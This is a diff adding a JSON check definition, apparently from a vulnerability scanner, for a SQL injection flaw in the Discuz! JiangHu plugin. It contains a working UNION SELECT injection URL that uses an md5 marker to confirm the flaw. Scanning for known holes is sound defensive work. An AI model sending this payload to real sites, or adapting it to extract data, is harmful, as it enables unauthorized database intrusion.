@@ -1,0 +1,23 @@
+{
+    "target":"discuz",
+    "meta":{
+        "name":    "Discuz! JiangHu Plugin SQL注入",
+        "remarks": "Discuz! JiangHu Plugin 存在SQL注入漏洞",
+        "level":   1,
+        "type":    "SQL注入",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0048"
+        }
+    },
+    "request":{
+        "path":     "/forummission.php?index=show&id=24%20and+1=2+union+select+1,2,md5(700),4,5,6,7,8,9,10,11--",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "e5841df2166dd424a57127423d276bbe"
+    }
+}
